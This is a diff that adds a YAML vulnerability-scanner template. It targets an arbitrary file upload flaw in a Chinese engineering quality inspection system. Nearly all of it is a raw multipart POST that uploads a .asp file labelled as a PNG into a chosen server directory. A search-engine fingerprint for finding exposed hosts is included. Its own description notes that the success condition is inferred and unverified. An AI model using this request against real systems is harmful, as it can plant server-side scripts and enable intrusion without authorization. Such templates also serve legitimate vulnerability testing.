@@ -1,0 +1,52 @@
+id: poc-2a51cfa042f9fecbc8bd
+info:
+  name: 湖南建研工程质量检测系统FileUpload存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2a51cfa042f9fecbc8bde966e7d73643
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2a51cfa042f9fecbc8bde966e7d73643
+    fofa: + hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+http:
+- raw:
+  - 'POST /Platform/System/FileUpload.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Connection: close
+
+    Content-Length: 336
+
+    Accept-Encoding: gzip
+
+    Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l
+
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+
+    Content-Disposition: form-data; name="file"; filename="YsOxWxSvj1KyZow1PTsh98fdu63.asp"
+
+    Content-Type: image/png
+
+
+    123
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+
+    Content-Disposition: form-data; name="target"
+
+
+    /Applications/SkillDevelopAndEHS/
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
